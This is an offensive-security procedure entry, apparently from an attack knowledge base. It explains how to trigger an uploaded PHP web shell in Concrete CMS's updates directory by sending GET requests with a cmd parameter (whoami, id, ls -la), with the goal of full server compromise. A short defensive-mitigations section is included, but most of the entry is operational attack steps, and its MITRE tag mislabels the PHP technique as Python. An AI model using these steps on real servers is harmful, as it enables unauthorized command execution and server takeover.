---
id: proc-concrete-payload-access-001
tags:
  - payload-access
  - rce
  - php
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
  - PHP
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Python]]'
updated_at: '2025-12-14T17:23:24.095Z'
skill_level: low
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Python]]'
---
# Access-Unzipped-Malicious-PHP-Payload

## Summary

This procedure accesses the unzipped PHP payload in the Concrete CMS updates directory via a direct HTTP request, executing the RCE code on the server.

## Description

Post-unzip, the poc.php file resides in /updates/<timestamp>/ and is web-accessible under the document root. Accessing http://target/updates/<timestamp>/poc.php?cmd=whoami executes the payload (e.g., system($_GET['cmd'])). This achieves full RCE. Prerequisites: unzip completed, timestamp known; expected outcome: arbitrary command execution on the server.

## Requirements

1. Known or guessed timestamp for directory
2. Web access to the target server
3. Payload includes RCE functionality (e.g., command execution)

## Defense

Defensive measures and detection strategies:

- Remove web server execution from updates directory (.htaccess deny)
- Monitor access logs for requests to /updates/
- Automatically clean updates after use

## Objectives

1. Execute PHP payload for RCE
2. Confirm attack success
3. Escalate to full server compromise

## Instructions

### Step 1: Construct URL

**Context**: Build the access path using the directory name.

Use http://target/updates/1600080000/poc.php (replace with actual timestamp).

> Expected output: PHP executes; if payload is system($_GET['cmd']), append ?cmd=id for output.

### Step 2: Trigger Execution

**Context**: Send request to run commands.

GET /updates/<timestamp>/poc.php?cmd=ls -la

> Expected output: Command output in HTTP response, confirming RCE.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Python]] PHP

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- payload-access
- rce
- php
